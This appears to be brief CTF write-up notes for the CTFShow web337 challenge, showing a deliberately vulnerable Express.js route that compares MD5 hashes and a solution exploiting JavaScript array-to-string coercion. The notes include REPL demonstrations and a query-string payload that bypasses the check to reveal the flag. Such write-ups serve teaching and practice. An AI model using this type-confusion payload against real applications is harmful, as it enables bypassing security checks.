CTF/WP/CTFShow/web337

- ```js
  var express = require('express');
  var router = express.Router();
  var crypto = require('crypto');
  
  function md5(s) {
    return crypto.createHash('md5')
      .update(s)
      .digest('hex');
  }
  
  /* GET home page. */
  router.get('/', function(req, res, next) {
    res.type('html');
    var flag='xxxxxxx';
    var a = req.query.a;
    var b = req.query.b;
    if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
    	res.end(flag);
    }else{
    	res.render('index',{ msg: 'tql'});
    }
    
  });
  
  module.exports = router;
  
  
  ```
- # 弱类型
	- ```js
	  > [] + "asdf"
	  'asdf'
	  > [1] + "asdf"
	  '1asdf'
	  > [1] + "asdf"
	  '1asdf'
	  > [undefined, 1] + "asdf"
	  ',1asdf'
	  > [1,2] + "asdf"
	  '1,2asdf'
	  > [1,2,3] + "asdf"
	  '1,2,3asdf'
	  > [1,"2,3"] + "asdf"
	  '1,2,3asdf'
	  > ["1,2",3] + "asdf"
	  '1,2,3asdf'
	  ```
	- `?a[]=1&a[]=2,3&b[]=1,2&b[]=3`
-